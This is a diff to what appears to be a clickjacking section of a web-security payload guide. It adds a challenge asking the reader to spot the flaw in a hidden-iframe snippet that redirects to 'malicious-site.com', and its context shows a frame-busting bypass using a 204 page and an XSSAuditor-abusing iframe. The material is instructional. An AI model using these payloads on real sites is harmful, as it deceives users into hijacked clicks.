@@ -20,7 +20,7 @@
 * [XSS Filter](#xss-filter)
   * [IE8 XSS filter](#ie8-xss-filter)
   * [Chrome 4.0 XSSAuditor filter](#chrome-40-xssauditor-filter)
-* [Challenge]
+* [Challenge](#challenge)
 * [Practice Environments](#practice-environments)
 * [Reference](#references)
 
@@ -149,13 +149,14 @@ Example in HTML meta tag:
  ```
 
 * The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a _"HTTP/1.1 204 No Content"_ header.
-`204 page`
+
+<br>_204 page:_
 ```php
 <?php
     header("HTTP/1.1 204 No Content");
 ?>
 ```
-`Attacker's Page`
+_Attacker's Page_
 ```js
 <script>
     var prevent_bust = 0;
@@ -194,6 +195,16 @@ It has a little different behaviour compared to IE8 XSS filter, in fact with thi
   ```html
   <iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
   ```
+
+## Challenge
+Inspect the following code:
+```html
+<div style="position: absolute; opacity: 0;">
+  <iframe src="https://legitimate-site.com/login" width="500" height="500"></iframe>
+</div>
+<button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
+```
+Determine the Clickjacking vulnerability within this code snippet. Identify how the hidden iframe is being used to exploit the user's actions when they click the button, leading them to a malicious website.
 
 
 ## Practice Environments
